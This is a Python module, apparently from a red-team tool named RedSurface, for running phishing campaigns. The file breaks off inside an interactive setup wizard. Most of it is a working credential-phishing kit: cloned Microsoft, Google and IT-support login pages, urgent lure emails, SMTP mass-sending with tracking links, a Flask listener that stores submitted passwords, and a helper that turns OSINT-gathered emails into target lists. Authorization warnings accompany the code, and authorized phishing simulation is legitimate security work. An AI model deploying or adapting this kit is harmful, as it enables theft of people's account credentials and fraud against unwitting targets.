"""
Phishing Simulation Module for RedSurface

This module provides phishing campaign simulation capabilities for authorized
red team engagements. It can leverage discovered emails from OSINT to create
targeted phishing campaigns.

WARNING: This module is for AUTHORIZED SECURITY TESTING ONLY.
Unauthorized use of this module against systems you don't own or have
explicit permission to test is illegal.
"""

import smtplib
import threading
import time
import logging
import base64
import json
from dataclasses import dataclass, field
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pathlib import Path
from typing import List, Dict, Optional, Set, Any

from utils.logger import get_logger

# Suppress Flask logging
logging.getLogger('werkzeug').setLevel(logging.ERROR)

# ==========================================
# HTML TEMPLATES
# ==========================================

FAKE_LOGIN_TEMPLATES = {
    "generic": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Session Expired</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        .logo { font-size: 24px; font-weight: bold; color: #1877f2; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold; }
        button:hover { background-color: #166fe5; }
        .warning { color: #dc3545; font-size: 14px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">{{COMPANY_NAME}}</div>
        <div class="warning">Your session has timed out due to inactivity.</div>
        <form method="POST" action="/login">
            <input type="email" name="email" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
""",
    "microsoft": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; padding: 44px; width: 100%; max-width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { margin-bottom: 16px; }
        .logo img { height: 24px; }
        .title { font-size: 24px; font-weight: 600; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin: 8px 0; border: none; border-bottom: 1px solid #666; box-sizing: border-box; font-size: 15px; }
        input:focus { border-bottom: 2px solid #0067b8; outline: none; }
        button { width: 100%; padding: 10px; background-color: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer; margin-top: 20px; }
        button:hover { background-color: #005a9e; }
        .subtitle { color: #666; font-size: 13px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo"><b>Microsoft</b></div>
        <div class="title">Sign in</div>
        <div class="subtitle">Session expired. Please sign in again.</div>
        <form method="POST" action="/login">
            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>
""",
    "google": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Google Sans', Roboto, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 100%; max-width: 450px; text-align: center; }
        .logo { font-size: 24px; margin-bottom: 8px; }
        .logo span { color: #4285f4; } .logo span:nth-child(2) { color: #ea4335; } .logo span:nth-child(3) { color: #fbbc05; } .logo span:nth-child(4) { color: #4285f4; } .logo span:nth-child(5) { color: #34a853; } .logo span:nth-child(6) { color: #ea4335; }
        .title { font-size: 24px; margin: 16px 0 8px; }
        .subtitle { color: #5f6368; font-size: 16px; margin-bottom: 24px; }
        input { width: 100%; padding: 13px 15px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        input:focus { border: 2px solid #1a73e8; outline: none; }
        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; cursor: pointer; margin-top: 20px; float: right; }
        button:hover { background-color: #1557b0; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
        <div class="title">Sign in</div>
        <div class="subtitle">Your session has expired</div>
        <form method="POST" action="/login">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
""",
    # Landing page for security_alert email template
    "security_alert": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Account Security - Verify Your Identity</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 420px; }
        .alert-header { background: linear-gradient(135deg, #d93025, #ea4335); color: white; padding: 20px; border-radius: 8px 8px 0 0; margin: -40px -40px 30px -40px; text-align: center; }
        .alert-icon { font-size: 48px; margin-bottom: 10px; }
        .alert-title { font-size: 20px; font-weight: 600; margin: 0; }
        .alert-subtitle { font-size: 14px; opacity: 0.9; margin-top: 5px; }
        .info-box { background: #fff3cd; border: 1px solid #ffc107; border-radius: 6px; padding: 15px; margin-bottom: 20px; font-size: 13px; color: #856404; }
        .info-box b { display: block; margin-bottom: 5px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 15px; }
        input:focus { border-color: #d93025; outline: none; box-shadow: 0 0 0 3px rgba(217,48,37,0.1); }
        button { width: 100%; padding: 14px; background: #d93025; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        button:hover { background: #c5221f; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="alert-header">
            <div class="alert-icon">🔒</div>
            <p class="alert-title">Verify Your Identity</p>
            <p class="alert-subtitle">Suspicious activity detected on your account</p>
        </div>
        <div class="info-box">
            <b>⚠️ Unusual Sign-in Detected</b>
            We noticed a sign-in attempt from an unrecognized location. Please verify your identity to secure your account.
        </div>
        <form method="POST" action="/login">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Current Password" required>
            <button type="submit">Verify & Secure Account</button>
        </form>
        <div class="footer">
            {{COMPANY_NAME}} Security Center<br>
            This verification is required to protect your account.
        </div>
    </div>
</body>
</html>
""",
    # Landing page for password_expiry email template
    "password_expiry": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Password Update Required</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); width: 100%; max-width: 400px; }
        .header { text-align: center; margin-bottom: 30px; }
        .icon { font-size: 60px; margin-bottom: 15px; }
        .title { font-size: 22px; font-weight: 600; color: #333; margin: 0 0 10px 0; }
        .subtitle { color: #666; font-size: 14px; }
        .timer { background: #fff3cd; border-radius: 8px; padding: 15px; text-align: center; margin-bottom: 25px; }
        .timer-label { font-size: 12px; color: #856404; text-transform: uppercase; letter-spacing: 1px; }
        .timer-value { font-size: 28px; font-weight: bold; color: #d63384; margin: 5px 0; }
        .timer-text { font-size: 13px; color: #666; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 2px solid #e9ecef; border-radius: 8px; box-sizing: border-box; font-size: 15px; transition: border-color 0.2s; }
        input:focus { border-color: #667eea; outline: none; }
        .password-hint { font-size: 11px; color: #999; margin-top: 5px; }
        button { width: 100%; padding: 14px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 15px; transition: transform 0.2s, box-shadow 0.2s; }
        button:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(102,126,234,0.4); }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="icon">🔐</div>
            <h1 class="title">Password Update Required</h1>
            <p class="subtitle">Your password is about to expire</p>
        </div>
        <div class="timer">
            <div class="timer-label">Time Remaining</div>
            <div class="timer-value">23:59:47</div>
            <div class="timer-text">Update now to avoid account lockout</div>
        </div>
        <form method="POST" action="/login">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Current Password" required>
            <input type="password" name="new_password" placeholder="New Password">
            <p class="password-hint">Password must be at least 8 characters with numbers and symbols</p>
            <button type="submit">Update Password</button>
        </form>
        <div class="footer">
            {{COMPANY_NAME}} IT Department<br>
            Mandatory security compliance
        </div>
    </div>
</body>
</html>
""",
    # Landing page for document_share email template
    "document_share": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>View Shared Document</title>
    <style>
        body { font-family: 'Google Sans', 'Segoe UI', Roboto, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); width: 100%; max-width: 450px; overflow: hidden; }
        .doc-header { background: #1a73e8; color: white; padding: 30px; text-align: center; }
        .doc-icon { font-size: 64px; margin-bottom: 15px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
        .doc-name { font-size: 18px; font-weight: 500; margin: 0 0 5px 0; }
        .doc-info { font-size: 13px; opacity: 0.9; }
        .content { padding: 30px; }
        .share-info { display: flex; align-items: center; padding: 15px; background: #f1f3f4; border-radius: 8px; margin-bottom: 25px; }
        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #1a73e8; color: white; display: flex; align-items: center; justify-content: center; font-weight: 600; margin-right: 12px; }
        .share-text { flex: 1; }
        .share-name { font-weight: 500; color: #333; }
        .share-detail { font-size: 13px; color: #666; }
        .message { font-size: 14px; color: #666; text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 15px; }
        input:focus { border: 2px solid #1a73e8; outline: none; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 10px; }
        button:hover { background: #1557b0; }
        .footer { text-align: center; padding: 15px; background: #f8f9fa; font-size: 12px; color: #999; border-top: 1px solid #e0e0e0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="doc-header">
            <div class="doc-icon">📊</div>
            <p class="doc-name">Q4_Financial_Report_2025.xlsx</p>
            <p class="doc-info">Microsoft Excel • 2.4 MB</p>
        </div>
        <div class="content">
            <div class="share-info">
                <div class="avatar">JD</div>
                <div class="share-text">
                    <div class="share-name">John Davidson</div>
                    <div class="share-detail">Shared this document with you</div>
                </div>
            </div>
            <p class="message">Sign in to view and download this document</p>
            <form method="POST" action="/login">
                <input type="email" name="email" placeholder="Email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Sign in to View</button>
            </form>
        </div>
        <div class="footer">
            Protected by {{COMPANY_NAME}} Document Security
        </div>
    </div>
</body>
</html>
""",
    # Landing page for it_support email template
    "it_support": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>IT Support - Account Verification</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #1a1a2e; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: white; border-radius: 10px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 100%; max-width: 420px; overflow: hidden; }
        .header { background: linear-gradient(135deg, #16213e 0%, #0f3460 100%); color: white; padding: 30px; text-align: center; }
        .logo { font-size: 28px; font-weight: bold; margin-bottom: 10px; }
        .logo-icon { display: inline-block; background: #28a745; width: 40px; height: 40px; border-radius: 8px; line-height: 40px; margin-right: 10px; }
        .header-title { font-size: 16px; opacity: 0.9; margin: 0; }
        .content { padding: 30px; }
        .ticket-box { background: #e8f5e9; border-left: 4px solid #28a745; padding: 15px; margin-bottom: 25px; border-radius: 0 6px 6px 0; }
        .ticket-label { font-size: 11px; color: #666; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
        .ticket-number { font-size: 18px; font-weight: 600; color: #28a745; font-family: monospace; }
        .verification-text { font-size: 14px; color: #555; margin-bottom: 20px; line-height: 1.6; }
        .verification-text b { color: #d63384; }
        .form-group { margin-bottom: 15px; }
        .form-label { display: block; font-size: 13px; font-weight: 500; color: #333; margin-bottom: 6px; }
        input { width: 100%; padding: 12px 14px; border: 2px solid #e9ecef; border-radius: 6px; box-sizing: border-box; font-size: 14px; transition: all 0.2s; }
        input:focus { border-color: #28a745; outline: none; box-shadow: 0 0 0 3px rgba(40,167,69,0.1); }
        button { width: 100%; padding: 14px; background: #28a745; color: white; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: all 0.2s; }
        button:hover { background: #218838; transform: translateY(-1px); }
        .requirements { background: #f8f9fa; padding: 15px; border-radius: 6px; margin-top: 20px; }
        .requirements-title { font-size: 12px; font-weight: 600; color: #333; margin-bottom: 10px; }
        .requirements-list { font-size: 12px; color: #666; margin: 0; padding-left: 18px; }
        .requirements-list li { margin-bottom: 4px; }
        .footer { text-align: center; padding: 20px; background: #f8f9fa; border-top: 1px solid #e9ecef; }
        .footer-text { font-size: 11px; color: #999; margin: 0; }
        .footer-link { color: #28a745; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <span class="logo-icon">🛡️</span>
                IT Support Portal
            </div>
            <p class="header-title">Account Verification System</p>
        </div>
        <div class="content">
            <div class="ticket-box">
                <div class="ticket-label">Support Ticket</div>
                <div class="ticket-number">#IT-SEC-2026-4892</div>
            </div>
            <p class="verification-text">
                As part of our <b>mandatory security audit</b>, please verify your account credentials below. 
                This verification must be completed within <b>48 hours</b> to avoid temporary account suspension.
            </p>
            <form method="POST" action="/login">
                <div class="form-group">
                    <label class="form-label">Corporate Email</label>
                    <input type="email" name="email" placeholder="your.name@company.com" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Current Password</label>
                    <input type="password" name="password" placeholder="Enter your password" required>
                </div>
                <button type="submit">Complete Verification</button>
            </form>
            <div class="requirements">
                <div class="requirements-title">Why is this required?</div>
                <ul class="requirements-list">
                    <li>Annual IT security compliance audit</li>
                    <li>Verification of active user accounts</li>
                    <li>Protection against unauthorized access</li>
                </ul>
            </div>
        </div>
        <div class="footer">
            <p class="footer-text">
                {{COMPANY_NAME}} IT Department • <a href="#" class="footer-link">Privacy Policy</a><br>
                Need help? Contact <a href="#" class="footer-link">helpdesk@company.com</a>
            </p>
        </div>
    </div>
</body>
</html>
"""
}

EMAIL_TEMPLATES = {
    "security_alert": {
        "subject": "Security Alert: Unusual Sign-in Activity Detected",
        "body": """
<html>
<body style="font-family: Arial, sans-serif; color: #333;">
    <p>Hello {{NAME}},</p>
    <p>We detected an unusual sign-in attempt on your account:</p>
    <table style="background: #f5f5f5; padding: 15px; border-radius: 5px; margin: 15px 0;">
        <tr><td><b>Location:</b></td><td>Moscow, Russia (IP: 45.12.19.11)</td></tr>
        <tr><td><b>Time:</b></td><td>{{TIMESTAMP}}</td></tr>
        <tr><td><b>Device:</b></td><td>Unknown Device</td></tr>
    </table>
    <p>If this wasn't you, please secure your account immediately:</p>
    <p><a href="{{LINK}}" style="background: #d93025; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; display: inline-block;">Secure My Account</a></p>
    <br>
    <p style="color: #666; font-size: 12px;">IT Security Team<br>Reference: #SEC-{{REF_ID}}</p>
</body>
</html>
"""
    },
    "password_expiry": {
        "subject": "Action Required: Your Password Will Expire Soon",
        "body": """
<html>
<body style="font-family: Arial, sans-serif; color: #333;">
    <p>Dear {{NAME}},</p>
    <p>Your password will expire in <b>24 hours</b>. To avoid losing access to your account, please update your password now.</p>
    <p><a href="{{LINK}}" style="background: #0067b8; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; display: inline-block;">Update Password</a></p>
    <p style="color: #666; margin-top: 20px;">If you don't update your password, you may be locked out of your account.</p>
    <br>
    <p style="color: #666; font-size: 12px;">IT Helpdesk<br>{{COMPANY_NAME}}</p>
</body>
</html>
"""
    },
    "document_share": {
        "subject": "{{SENDER_NAME}} shared a document with you",
        "body": """
<html>
<body style="font-family: Arial, sans-serif; color: #333;">
    <p>{{SENDER_NAME}} has shared a document with you.</p>
    <div style="background: #f8f9fa; border: 1px solid #dadce0; border-radius: 8px; padding: 20px; margin: 20px 0; text-align: center;">
        <div style="font-size: 48px;">📄</div>
        <p style="font-weight: bold; margin: 10px 0;">Q4_Financial_Report_2025.xlsx</p>
        <p style="color: #666;">Click below to view the document</p>
        <a href="{{LINK}}" style="background: #1a73e8; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; display: inline-block; margin-top: 10px;">Open Document</a>
    </div>
    <p style="color: #999; font-size: 11px;">This link will expire in 7 days.</p>
</body>
</html>
"""
    },
    "it_support": {
        "subject": "IT Support: Account Verification Required",
        "body": """
<html>
<body style="font-family: Arial, sans-serif; color: #333;">
    <p>Hello {{NAME}},</p>
    <p>As part of our ongoing security audit, we need you to verify your account credentials.</p>
    <p>This is a mandatory verification required by the IT Security Policy. Failure to complete this within 48 hours will result in temporary account suspension.</p>
    <p><a href="{{LINK}}" style="background: #28a745; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; display: inline-block;">Verify My Account</a></p>
    <br>
    <p style="color: #666; font-size: 12px;">IT Support Team<br>Ticket: #IT-{{REF_ID}}</p>
</body>
</html>
"""
    }
}


@dataclass
class PhishingTarget:
    """Represents a phishing campaign target."""
    email: str
    name: str = "Employee"
    department: str = ""
    clicked: bool = False
    clicked_at: Optional[datetime] = None
    credentials_entered: bool = False
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "email": self.email,
            "name": self.name,
            "department": self.department,
            "clicked": self.clicked,
            "clicked_at": self.clicked_at.isoformat() if self.clicked_at else None,
            "credentials_entered": self.credentials_entered,
        }


@dataclass
class PhishingCampaign:
    """Represents a phishing campaign."""
    name: str
    targets: List[PhishingTarget] = field(default_factory=list)
    template: str = "security_alert"
    landing_page: str = "generic"
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None
    emails_sent: int = 0
    emails_failed: int = 0
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "template": self.template,
            "landing_page": self.landing_page,
            "started_at": self.started_at.isoformat() if self.started_at else None,
            "completed_at": self.completed_at.isoformat() if self.completed_at else None,
            "stats": {
                "total_targets": len(self.targets),
                "emails_sent": self.emails_sent,
                "emails_failed": self.emails_failed,
                "clicks": sum(1 for t in self.targets if t.clicked),
                "credentials_captured": sum(1 for t in self.targets if t.credentials_entered),
                "click_rate": f"{(sum(1 for t in self.targets if t.clicked) / len(self.targets) * 100):.1f}%" if self.targets else "0%",
            },
            "targets": [t.to_dict() for t in self.targets],
        }


class PhishingSimulator:
    """
    Red Team phishing simulation module for authorized security testing.
    
    This module provides capabilities to:
    - Send simulated phishing emails to target lists
    - Track link clicks and credential submissions
    - Generate campaign reports
    
    WARNING: For authorized use only. Ensure you have explicit written
    permission before conducting any phishing simulations.
    """
    
    def __init__(
        self,
        smtp_host: str = "smtp.mailtrap.io",
        smtp_port: int = 2525,
        smtp_username: Optional[str] = None,
        smtp_password: Optional[str] = None,
        tracking_host: str = "http://127.0.0.1:5000",
        company_name: str = "SecurePortal",
    ):
        """
        Initialize the phishing simulator.
        
        Args:
            smtp_host: SMTP server hostname
            smtp_port: SMTP server port
            smtp_username: SMTP authentication username
            smtp_password: SMTP authentication password
            tracking_host: Base URL for the tracking/phishing server
            company_name: Company name to use in templates
        """
        self.smtp_host = smtp_host
        self.smtp_port = smtp_port
        self.smtp_user = smtp_username
        self.smtp_pass = smtp_password
        self.tracking_host = tracking_host.rstrip('/')
        self.company_name = company_name
        
        self.logger = get_logger()
        
        # Campaign tracking
        self.current_campaign: Optional[PhishingCampaign] = None
        self.targets_map: Dict[str, PhishingTarget] = {}  # email -> target
        self.captured_credentials: List[Dict[str, str]] = []
        
        # Flask server
        self.app = None
        self.server_thread = None
        self.is_running = False
        
    def _setup_flask_app(self, landing_template: str = "generic"):
        """Set up Flask application with routes."""
        try:
            from flask import Flask, request, redirect, render_template_string
        except ImportError:
            self.logger.error("Flask not installed. Run: pip install flask")
            return None
            
        app = Flask("PhishingListener")
        
        # Get the landing page HTML
        landing_html = FAKE_LOGIN_TEMPLATES.get(landing_template, FAKE_LOGIN_TEMPLATES["generic"])
        landing_html = landing_html.replace("{{COMPANY_NAME}}", self.company_name)
        
        @app.route('/login', methods=['GET', 'POST'])
        def login():
            if request.method == 'POST':
                email = request.form.get('email', '')
                password = request.form.get('password', '')
                
                if email and password:
                    self.captured_credentials.append({
                        "email": email,
                        "password": password,
                        "timestamp": datetime.now().isoformat(),
                        "ip": request.remote_addr,
                        "user_agent": request.headers.get('User-Agent', ''),
                    })
                    
                    # Mark target as having entered credentials
                    for target in self.targets_map.values():
                        if target.email.lower() == email.lower():
                            target.credentials_entered = True
                            break
                    
                    self.logger.warning(f"[PHISH] Credentials captured for: {email}")
                
                # Redirect to real login page or success message
                return redirect("https://www.google.com")
            
            return render_template_string(landing_html)
        
        @app.route('/track/<path:target_id>')
        def track_click(target_id):
            """Track when a target clicks the phishing link."""
            try:
                # Decode the target ID (base64 encoded email)
                email = base64.urlsafe_b64decode(target_id.encode()).decode()
            except:
                email = target_id
            
            # Find and update the target
            if email in self.targets_map:
                target = self.targets_map[email]
                if not target.clicked:
                    target.clicked = True
                    target.clicked_at = datetime.now()
                    self.logger.warning(f"[PHISH] 🎣 Target clicked: {email}")
            
            return redirect('/login')
        
        @app.route('/status')
        def status():
            """Return campaign status as JSON."""
            if self.current_campaign:
                return self.current_campaign.to_dict()
            return {"status": "no active campaign"}
        
        return app
    
    def start_listener(self, port: int = 5000, landing_template: str = "generic"):
        """
        Start the phishing tracking server.
        
        Args:
            port: Port to run the server on
            landing_template: Which landing page template to use
        """
        if self.is_running:
            self.logger.info("Phishing listener already running")
            return
        
        self.app = self._setup_flask_app(landing_template)
        if not self.app:
            return
        
        self.is_running = True
        
        def run_server():
            self.app.run(host='0.0.0.0', port=port, use_reloader=False, threaded=True)
        
        self.server_thread = threading.Thread(target=run_server, daemon=True)
        self.server_thread.start()
        
        self.logger.info(f"Phishing listener started on {self.tracking_host}")
        self.logger.info(f"Tracking URL format: {self.tracking_host}/track/<encoded_email>")
    
    def create_campaign(
        self,
        name: str,
        targets: List[Dict[str, str]],
        template: str = "security_alert",
        landing_page: str = "generic",
    ) -> PhishingCampaign:
        """
        Create a new phishing campaign.
        
        Args:
            name: Campaign name
            targets: List of dicts with 'email' and optionally 'name', 'department'
            template: Email template to use
            landing_page: Landing page template to use
            
        Returns:
            PhishingCampaign object
        """
        campaign_targets = []
        self.targets_map.clear()
        
        for t in targets:
            target = PhishingTarget(
                email=t.get('email', ''),
                name=t.get('name', 'Employee'),
                department=t.get('department', ''),
            )
            campaign_targets.append(target)
            self.targets_map[target.email] = target
        
        self.current_campaign = PhishingCampaign(
            name=name,
            targets=campaign_targets,
            template=template,
            landing_page=landing_page,
        )
        
        self.logger.info(f"Campaign '{name}' created with {len(campaign_targets)} targets")
        return self.current_campaign
    
    def send_campaign(
        self,
        sender_email: str = "security@internal-support.com",
        sender_name: str = "IT Security",
        delay_between_emails: float = 1.0,
    ) -> bool:
        """
        Send phishing emails to all campaign targets.
        
        Args:
            sender_email: Email address to send from
            sender_name: Display name for sender
            delay_between_emails: Seconds to wait between emails
            
        Returns:
            True if campaign was sent successfully
        """
        if not self.current_campaign:
            self.logger.error("No campaign created. Call create_campaign() first.")
            return False
        
        if not self.smtp_user or not self.smtp_pass:
            self.logger.error("SMTP credentials not configured")
            return False
        
        # Get email template
        template_data = EMAIL_TEMPLATES.get(
            self.current_campaign.template,
            EMAIL_TEMPLATES["security_alert"]
        )
        
        self.logger.info(f"Connecting to SMTP server {self.smtp_host}:{self.smtp_port}...")
        
        try:
            server = smtplib.SMTP(self.smtp_host, self.smtp_port)
            server.starttls()
            server.login(self.smtp_user, self.smtp_pass)
        except Exception as e:
            self.logger.error(f"SMTP connection failed: {e}")
            return False
        
        self.current_campaign.started_at = datetime.now()
        self.logger.info(f"Launching campaign '{self.current_campaign.name}' against {len(self.current_campaign.targets)} targets...")
        
        for target in self.current_campaign.targets:
            if not target.email:
                continue
            
            # Generate tracking link (base64 encode the email)
            encoded_email = base64.urlsafe_b64encode(target.email.encode()).decode()
            tracking_link = f"{self.tracking_host}/track/{encoded_email}"
            
            # Build email
            msg = MIMEMultipart('alternative')
            msg['From'] = f"{sender_name} <{sender_email}>"
            msg['To'] = target.email
            msg['Subject'] = template_data["subject"].replace(
                "{{SENDER_NAME}}", sender_name
            )
            
            # Build body with replacements
            body = template_data["body"]
            body = body.replace("{{NAME}}", target.name)
            body = body.replace("{{LINK}}", tracking_link)
            body = body.replace("{{COMPANY_NAME}}", self.company_name)
            body = body.replace("{{TIMESTAMP}}", datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"))
            body = body.replace("{{REF_ID}}", f"{hash(target.email) % 10000:04d}")
            body = body.replace("{{SENDER_NAME}}", sender_name)
            
            msg.attach(MIMEText(body, 'html'))
            
            try:
                server.sendmail(sender_email, target.email, msg.as_string())
                self.current_campaign.emails_sent += 1
                self.logger.info(f"  [+] Sent to: {target.email}")
            except Exception as e:
                self.current_campaign.emails_failed += 1
                self.logger.warning(f"  [-] Failed: {target.email} - {e}")
            
            time.sleep(delay_between_emails)
        
        server.quit()
        self.current_campaign.completed_at = datetime.now()
        
        self.logger.info(f"Campaign complete: {self.current_campaign.emails_sent} sent, {self.current_campaign.emails_failed} failed")
        return True
    
    def get_results(self) -> Dict[str, Any]:
        """Get current campaign results."""
        if not self.current_campaign:
            return {"error": "No active campaign"}
        
        return self.current_campaign.to_dict()
    
    def get_clicked_targets(self) -> List[PhishingTarget]:
        """Get list of targets who clicked the link."""
        if not self.current_campaign:
            return []
        return [t for t in self.current_campaign.targets if t.clicked]
    
    def get_captured_credentials(self) -> List[Dict[str, str]]:
        """Get list of captured credentials."""
        return self.captured_credentials.copy()
    
    def export_report(self, output_path: Path) -> Path:
        """
        Export campaign report to JSON file.
        
        Args:
            output_path: Directory to save the report
            
        Returns:
            Path to the saved report
        """
        if not self.current_campaign:
            self.logger.error("No campaign to export")
            return None
        
        report = {
            "campaign": self.current_campaign.to_dict(),
            "captured_credentials": [
                {**c, "password": "***REDACTED***"} for c in self.captured_credentials
            ],
            "exported_at": datetime.now().isoformat(),
        }
        
        output_path = Path(output_path)
        output_path.mkdir(parents=True, exist_ok=True)
        
        report_file = output_path / f"phishing_campaign_{self.current_campaign.name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Campaign report exported to: {report_file}")
        return report_file
    
    def stop(self):
        """Stop the phishing listener."""
        self.is_running = False
        self.logger.info("Phishing listener stopped")


def create_targets_from_osint(emails: List[str], people: List[Dict[str, Any]]) -> List[Dict[str, str]]:
    """
    Convert OSINT-discovered emails and people into phishing targets.
    
    Args:
        emails: List of discovered email addresses
        people: List of discovered people with names
        
    Returns:
        List of target dictionaries suitable for create_campaign()
    """
    targets = []
    email_to_name = {}
    
    # Map emails to names from people data
    for person in people:
        name = person.get('name', '')
        person_emails = person.get('emails', [])
        for email in person_emails:
            if name:
                email_to_name[email.lower()] = name
    
    # Create target entries
    for email in emails:
        name = email_to_name.get(email.lower(), '')
        if not name:
            # Try to derive name from email
            local_part = email.split('@')[0]
            # Convert john.doe or john_doe to John Doe
            name_parts = local_part.replace('.', ' ').replace('_', ' ').replace('-', ' ').split()
            name = ' '.join(part.capitalize() for part in name_parts)
        
        targets.append({
            'email': email,
            'name': name or 'Employee',
        })
    
    return targets


# ==========================================
# CLI Integration
# ==========================================

def run_phishing_wizard() -> Optional[PhishingSimulator]:
    """Interactive wizard for setting up a phishing campaign."""
    try:
        import questionary
    except ImportError:
        print("[!] questionary not installed. Run: pip install questionary")
        return None
    
    print("\n" + "=" * 60)
    print("  PHISHING SIMULATION MODULE")
    print("  WARNING: For authorized security testing only!")
    print("=" * 60 + "\n")
    
    # Confirm authorization
    if not questionary.confirm(
        "Do you have explicit written authorization to conduct this phishing simulation?",
        default=False
    ).ask():
        print("[!] Authorization required. Aborting.")
        return None
    
    # SMTP Configuration
    print("\n[*] SMTP Configuration")
    smtp_host = questionary.text("SMTP Host:", default="smtp.mailtrap.io").ask()
    smtp_port = questionary.text("SMTP Port:", default="2525").ask()
    smtp_user = questionary.text("SMTP Username:").ask()
    smtp_pass = questionary.password("SMTP Password:").ask()
    
    # Tracking Configuration
    print("\n[*] Tracking Server Configuration")
    tracking_host = questionary.text(
        "Tracking Server URL:",
